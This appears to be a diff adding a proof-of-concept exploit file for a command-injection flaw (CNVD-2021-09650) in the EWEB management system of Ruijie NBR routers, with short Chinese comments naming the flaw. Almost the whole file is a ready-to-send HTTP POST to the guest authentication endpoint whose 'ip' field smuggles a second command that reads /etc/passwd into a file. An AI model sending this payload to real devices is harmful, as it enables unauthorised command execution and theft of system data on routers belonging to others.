@@ -1,0 +1,11 @@
+# 锐捷 NBR路由器 远程命令执行漏洞(CNVD-2021-09650)
+# 锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限
+POST /guest_auth/guestIsUp.php?acid=80051542&bid=hd_tag_m8mv245b HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv245b
+RM-PRO-Token: 5f080cf0024b69f020fadd81661d44eb
+RM-PRO-Time: 1742808364255
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
